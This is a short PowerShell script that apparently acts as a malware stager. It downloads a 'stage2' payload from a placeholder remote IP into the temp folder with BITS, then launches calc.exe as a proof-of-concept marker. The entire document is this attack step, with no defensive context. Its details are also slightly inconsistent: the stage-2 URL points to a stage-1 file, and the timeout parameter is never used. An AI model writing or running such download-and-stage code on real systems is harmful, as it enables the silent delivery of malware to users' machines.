[CmdletBinding()]
param(
    [string]$Stage2Url = "http://203.0.113.26/stage1.ps1",
    [string]$LocalPath = "$env:TEMP\stage2.bin",
    [int]$TransferTimeout = 54
)
Start-BitsTransfer -Source $Stage2Url -Destination $LocalPath
Start-Process -FilePath "calc.exe"
$ProgressPreference = "SilentlyContinue"
